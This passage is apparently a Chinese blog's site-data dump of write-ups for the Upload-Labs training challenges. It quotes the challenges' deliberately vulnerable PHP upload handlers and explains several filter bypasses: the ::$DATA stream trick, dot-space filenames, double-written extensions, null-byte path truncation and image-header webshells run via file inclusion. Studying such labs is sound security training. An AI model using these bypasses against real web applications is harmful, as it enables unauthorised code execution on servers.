array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span><br><span class=\"line\">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class=\"line\">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class=\"line\">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class=\"line\">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class=\"line\">        $file_ext = trim($file_ext); //首尾去空</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class=\"line\">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span><br><span class=\"line\">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class=\"line\">                $is_upload = true;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    审查代码发现少了对<code>::$DATA</code>字符串的处理，这里就要用到前面提到的windows环境了，贴一下原理：</p>\n<blockquote>\n<p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p>\n</blockquote>\n<p>​    直接上传的时候抓包在文件名后面添加<code>::$DATA</code>。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BbP84P.png\"></p>\n<p>​    上传访问。完工</p>\n<h2 id=\"Pass-09\"><a href=\"#Pass-09\" class=\"headerlink\" title=\"Pass-09\"></a>Pass-09</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class=\"line\">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class=\"line\">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class=\"line\">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class=\"line\">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class=\"line\">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class=\"line\">        $file_ext = trim($file_ext); //首尾去空</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class=\"line\">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class=\"line\">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class=\"line\">                $is_upload = true;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    这次题目和第七题差不多，代码会先剔除文件名前后的空格，然后删除末尾的点，再通过<code>strrchr()</code>函数截取后缀名转换小写。</p>\n<p>​    所以和第七题一样构造<strong>2333.php. .</strong>(末尾加 点 空格 点)，被处理后的文件名后缀就成了一个点”.”，铁定不在黑名单后缀里，实现绕过后缀检查。</p>\n<p>​    但是这道题<strong>只能使用windows环境</strong>，因为执行了<code>deldot()</code>函数删除了最后一个点之后，文件名成了<code>2333.php.</code>，而linux环境下因为不会自动删除最后一个点而不能访问成功。</p>\n<p>​    图前面有了就不贴了。</p>\n<h2 id=\"Pass-10\"><a href=\"#Pass-10\" class=\"headerlink\" title=\"Pass-10\"></a>Pass-10</h2><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class=\"line\">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class=\"line\">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">        $img_path =  UPLOAD_PATH.&#x27;/&#x27;.$file_name;        </span><br><span class=\"line\">        if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class=\"line\">            $is_upload = true;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    这道题和前面不同的是<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name)</code>，对于这个函数：<code>str_ireplace(find,replace,string,count)</code>，find是要查找的值，replace是要替换成的值，string是被搜索的字符串，count 可选。一个变量，对替换数进行计数。所以这行代码的作用就是把文件名中所有包含在黑名单后缀里的字符串替换成空串，但是这个函数只会执行一次，所以我们可以构造一个双写绕过，即构造文件名<code>2333.pphphp</code>，只有一个”php”字符串被匹配到并被替换成空串，剩下的文件名就成了<code>2333.php</code>。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/Bb8yPf.png\"></p>\n<p>上传并访问文件。完工</p>\n"},{"title":"Upload-Labs(三)","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116160237.png","date":"2020-11-16T08:04:30.000Z","_content":"\n## 前言\n\n​\t继续接着上一次的`Upload-labs`往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。\n\n​\t在线靶机地址：\n\n* [linux环境](https://buuoj.cn/challenges#Upload-Labs-Linux)\n* [windows环境](https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows)\n\n## Pass-11\n\n​\t(这题使用了windows环境)\n\n​\t源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else{\n        $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n    }\n}\n```\n\n​\t分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了`$_GET['save_path']`，本题提示也写道\n\n`本pass上传路径可控！`，就是通过这个GET变量控制上传路径。\n\n​\t这一关的突破方法需要有一些条件：php版本需要低于`5.3.29`（我使用的是php版本5.3.17的本地靶机），另一个条件是`magic_quotes_gpc`需要为关闭状态。`magic_quotes_gpc`的作用官方文档写道：\n\n>**Warning** 本特性已自 PHP 5.3.0 起*废弃*并将自 PHP 5.4.0 起*移除*。\n>\n>​      为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。      当 magic_quotes 为 on，所有的 ' (单引号)、\" (双引号)、\\（反斜杠）和 NUL's 被一个反斜杠自动转义。     \n\n​\t使用bp抓包并添加`0x00截断`，在GET请求中可以使用url编码的截断：`%00`。贴个自己参考的博客，[截断上传原理剖析](https://www.cnblogs.com/milantgh/p/3612978.html)。个人对于这道题的分析就是，上面文件的代码执行到第8行的时候，获取到了`$_GET['save_path']`变量的值，但是我们在这个变量后面添加了`0x00截断`，所以后面的代码便不会执行，文件也就不会被重命名。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115204109.png)\n\n​\t文件成功上传，然后访问的时候记得改一下路径，因为文件名已经截断，所以访问路径由`..../upload/233.php�/5120201115205501.jpg`变为`..../upload/233.php`。完工\n\n\n\n## Pass-12\n\n​\t（windows环境）\n\n​\t这题和上一题差不多一样，就是把`$_GET['save_path']`变成了`$_POST['save_path']`。由GET请求改成了POST请求，但是抓包修改的地方就不一样了，需要通过**16进制修改**\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115210935.png)\n\n​\t这里我命名为`233.phpa`是因为方便我在Hex表中找到这句话的位置和修改数据。`a`的16进制是`61`，需要改成截断的值：`00`\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115211024.png)\n\n​\t上传成功以后打开图片，和上一题一样，需要把路径中已经截断的后面删除掉。完工\n\n\n\n## Pass-13\n\n​\t（Linux环境）\n\n​\t源码中有关的函数解释：\n\n> [PHP中pack、unpack的详细用法](https://segmentfault.com/a/1190000008305573)\n>\n> [fread()](https://www.php.net/manual/zh/function.fread.php)\n>\n> [fclose()](https://www.php.net/fclose)\n>\n> [intval()](https://www.php.net/intval)\n\n​\t这道题和前面题目都不一样了：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115211509.png)\n\n​\t题目说道需要**上传图片马**，然后使用**文件包含漏洞**进行测试，那么我们就先制作图片马。\n\n​\t查看本题的提示`本pass检查图标内容开头2个字节！`，意思就是只检测文件前面两个字节的标识，贴一个[各种格式图片文件头标识分析](https://blog.csdn.net/qq_37414405/article/details/84660148)，所以这道题只用在上传的文件头部的两个字节处粘贴对应**文件的头标识**即可绕过检测。\n\n​\t以GIF的文件头GIF89a 为例，创建文件notepad++编辑打开输入`GIF89a<?php phpinfo(); ?>`，后缀名无所谓了，因为题目只检测前两个字节即可上传。\n\n​\t**还有一种方法制作图片马**：使用windows的`copy /b`指令，把两个文件进行~~无缝~~拼接，可以使用一张正常的图片加一个php文件进行拼接，即可正常上传。参考博客：[windows窗口命令——(copy/b)文件无缝拼接隐藏](https://blog.csdn.net/gaoshi66/article/details/83653143)。\n\n​\t别忘了题目中说道了需要**三种后缀都上传成功才算过关！**\n\n​\t**上传以后需要使用文件包含进行判定是否执行**，先在新标签页面中打开图片，url中记下图片在服务器中的目录和名称（我的图片名称为8220201116071327.gif），点击**2**的链接进入`include.php`进行文件包含：网址输入`https://...../include.php?file=./upload/8220201116071327.gif`，找到php成功执行的页面。这里还有一个小知识点我学到的就是：[路径中的'.'和'..'还有'./'和'../'都是什么意思](https://www.cnblogs.com/xc90/articles/10257402.html)。完工\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116152417.png)\n\n\n\n## Pass-14\n\n​\t（Linux环境）\n\n​\t这题提示写道`本pass使用getimagesize()检查是否为图片文件！`，和上一题不一样的地方就是使用了`getimagesize()`函数，这个函数的官方文档[getimagesize()](https://www.php.net/manual/zh/function.getimagesize.php)，所以这道题就不能用13题的加**文件的头标识**方法绕过，这次要使用上一题中的`copy /b`指令用一张正常的图片进行拼接还是可以通过的。\n\n​\tPS：听同学说`getimagesize()`不过是检测了前八个字节，不过我没试。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116155407.png)\n\n​\t因为是拼接的，所以要直接摸到图片最底部查看成功。完工\n\n\n\n## Pass-15\n\n​\t（Linux环境）\n\n​\t13、14、15题都是对**文件的头标识**进行了检测，只不过第十四关使用的是getimagesize函数，第十五关使用的是exif_imagetype函数,函数返回值内容不一样而已。使用`copy /b`制作的图片马可以直接通过。\n\n​\t网上搜集过来的资料\n\n> png 文件头  89504E470D0A1A0A\n>\n> jpg 文件头 89504E470D0A1A0A\n>\n> gif 文件头 474946383961\n\n​\t这几个字节应该都是够长的可以绕过这三个函数，所以验证了同学说的不同的函数检测的文件头长度是不一样的。完工\n\n\n\n","source":"_posts/Upload-Labs3.md","raw":"---\ntitle: Upload-Labs(三)\ncategories:\n- DROPS\ntags:\n- 文件上传漏洞\ncover: 'https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116160237.png'\ndate: 2020-11-16 16:04:30\n---\n\n## 前言\n\n​\t继续接着上一次的`Upload-labs`往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。\n\n​\t在线靶机地址：\n\n* [linux环境](https://buuoj.cn/challenges#Upload-Labs-Linux)\n* [windows环境](https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows)\n\n## Pass-11\n\n​\t(这题使用了windows环境)\n\n​\t源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else{\n        $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n    }\n}\n```\n\n​\t分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了`$_GET['save_path']`，本题提示也写道\n\n`本pass上传路径可控！`，就是通过这个GET变量控制上传路径。\n\n​\t这一关的突破方法需要有一些条件：php版本需要低于`5.3.29`（我使用的是php版本5.3.17的本地靶机），另一个条件是`magic_quotes_gpc`需要为关闭状态。`magic_quotes_gpc`的作用官方文档写道：\n\n>**Warning** 本特性已自 PHP 5.3.0 起*废弃*并将自 PHP 5.4.0 起*移除*。\n>\n>​      为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。      当 magic_quotes 为 on，所有的 ' (单引号)、\" (双引号)、\\（反斜杠）和 NUL's 被一个反斜杠自动转义。     \n\n​\t使用bp抓包并添加`0x00截断`，在GET请求中可以使用url编码的截断：`%00`。贴个自己参考的博客，[截断上传原理剖析](https://www.cnblogs.com/milantgh/p/3612978.html)。个人对于这道题的分析就是，上面文件的代码执行到第8行的时候，获取到了`$_GET['save_path']`变量的值，但是我们在这个变量后面添加了`0x00截断`，所以后面的代码便不会执行，文件也就不会被重命名。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115204109.png)\n\n​\t文件成功上传，然后访问的时候记得改一下路径，因为文件名已经截断，所以访问路径由`..../upload/233.php�/5120201115205501.jpg`变为`..../upload/233.php`。完工\n\n\n\n## Pass-12\n\n​\t（windows环境）\n\n​\t这题和上一题差不多一样，就是把`$_GET['save_path']`变成了`$_POST['save_path']`。由GET请求改成了POST请求，但是抓包修改的地方就不一样了，需要通过**16进制修改**\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115210935.png)\n\n​\t这里我命名为`233.phpa`是因为方便我在Hex表中找到这句话的位置和修改数据。`a`的16进制是`61`，需要改成截断的值：`00`\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115211024.png)\n\n​\t上传成功以后打开图片，和上一题一样，需要把路径中已经截断的后面删除掉。完工\n\n\n\n## Pass-13\n\n​\t（Linux环境）\n\n​\t源码中有关的函数解释：\n\n> [PHP中pack、unpack的详细用法](https://segmentfault.com/a/1190000008305573)\n>\n> [fread()](https://www.php.net/manual/zh/function.fread.php)\n>\n> [fclose()](https://www.php.net/fclose)\n>\n> [intval()](https://www.php.net/intval)\n\n​\t这道题和前面题目都不一样了：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115211509.png)\n\n​\t题目说道需要**上传图片马**，然后使用**文件包含漏洞**进行测试，那么我们就先制作图片马。\n\n​\t查看本题的提示`本pass检查图标内容开头2个字节！`，意思就是只检测文件前面两个字节的标识，贴一个[各种格式图片文件头标识分析](https://blog.csdn.net/qq_37414405/article/details/84660148)，所以这道题只用在上传的文件头部的两个字节处粘贴对应**文件的头标识**即可绕过检测。\n\n​\t以GIF的文件头GIF89a 为例，创建文件notepad++编辑打开输入`GIF89a<?php phpinfo(); ?>`，后缀名无所谓了，因为题目只检测前两个字节即可上传。\n\n​\t**还有一种方法制作图片马**：使用windows的`copy /b`指令，把两个文件进行~~无缝~~拼接，可以使用一张正常的图片加一个php文件进行拼接，即可正常上传。参考博客：[windows窗口命令——(copy/b)文件无缝拼接隐藏](https://blog.csdn.net/gaoshi66/article/details/83653143)。\n\n​\t别忘了题目中说道了需要**三种后缀都上传成功才算过关！**\n\n​\t**上传以后需要使用文件包含进行判定是否执行**，先在新标签页面中打开图片，url中记下图片在服务器中的目录和名称（我的图片名称为8220201116071327.gif），点击**2**的链接进入`include.php`进行文件包含：网址输入`https://...../include.php?file=./upload/8220201116071327.gif`，找到php成功执行的页面。这里还有一个小知识点我学到的就是：[路径中的'.'和'..'还有'./'和'../'都是什么意思](https://www.cnblogs.com/xc90/articles/10257402.html)。完工\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116152417.png)\n\n\n\n## Pass-14\n\n​\t（Linux环境）\n\n​\t这题提示写道`本pass使用getimagesize()检查是否为图片文件！`，和上一题不一样的地方就是使用了`getimagesize()`函数，这个函数的官方文档[getimagesize()](https://www.php.net/manual/zh/function.getimagesize.php)，所以这道题就不能用13题的加**文件的头标识**方法绕过，这次要使用上一题中的`copy /b`指令用一张正常的图片进行拼接还是可以通过的。\n\n​\tPS：听同学说`getimagesize()`不过是检测了前八个字节，不过我没试。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116155407.png)\n\n​\t因为是拼接的，所以要直接摸到图片最底部查看成功。完工\n\n\n\n## Pass-15\n\n​\t（Linux环境）\n\n​\t13、14、15题都是对**文件的头标识**进行了检测，只不过第十四关使用的是getimagesize函数，第十五关使用的是exif_imagetype函数,函数返回值内容不一样而已。使用`copy /b`制作的图片马可以直接通过。\n\n​\t网上搜集过来的资料\n\n> png 文件头  89504E470D0A1A0A\n>\n> jpg 文件头 89504E470D0A1A0A\n>\n> gif 文件头 474946383961\n\n​\t这几个字节应该都是够长的可以绕过这三个函数，所以验证了同学说的不同的函数检测的文件头长度是不一样的。完工\n\n\n\n","slug":"Upload-Labs3","published":1,"updated":"2021-12-30T09:42:54.198Z","_id":"ckrr3f9aw000ohotc0wfc8lqf","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    继续接着上一次的<code>Upload-labs</code>往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。</p>\n<p>​    在线靶机地址：</p>\n<ul>\n<li><a href=\"https://buuoj.cn/challenges#Upload-Labs-Linux\">linux环境</a></li>\n<li><a href=\"https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows\">windows环境</a></li>\n</ul>\n<h2 id=\"Pass-11\"><a href=\"#Pass-11\" class=\"headerlink\" title=\"Pass-11\"></a>Pass-11</h2><p>​    (这题使用了windows环境)</p>\n<p>​    源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = substr(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],strrpos(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;save_path&#x27;</span>].<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了<code>$_GET[&#39;save_path&#39;]</code>，本题提示也写道</p>\n<p><code>本pass上传路径可控！</code>，就是通过这个GET变量控制上传路径。</p>\n<p>​    这一关的突破方法需要有一些条件：php版本需要低于<code>5.3.29</code>（我使用的是php版本5.3.17的本地靶机），另一个条件是<code>magic_quotes_gpc</code>需要为关闭状态。<code>magic_quotes_gpc</code>的作用官方文档写道：</p>\n<blockquote>\n<p><strong>Warning</strong> 本特性已自 PHP 5.3.0 起<em>废弃</em>并将自 PHP 5.4.0 起<em>移除</em>。</p>\n<p>​      为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。      当 magic_quotes 为 on，所有的 ‘ (单引号)、” (双引号)、\\（反斜杠）和 NUL’s 被一个反斜杠自动转义。     </p>\n</blockquote>\n<p>​    使用bp抓包并添加<code>0x00截断</code>，在GET请求中可以使用url编码的截断：<code>%00</code>。贴个自己参考的博客，<a href=\"https://www.cnblogs.com/milantgh/p/3612978.html\">截断上传原理剖析</a>。个人对于这道题的分析就是，上面文件的代码执行到第8行的时候，获取到了<code>$_GET[&#39;save_path&#39;]</code>变量的值，但是我们在这个变量后面添加了<code>0x00截断</code>，所以后面的代码便不会执行，文件也就不会被重命名。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115204109.png\"></p>\n<p>​    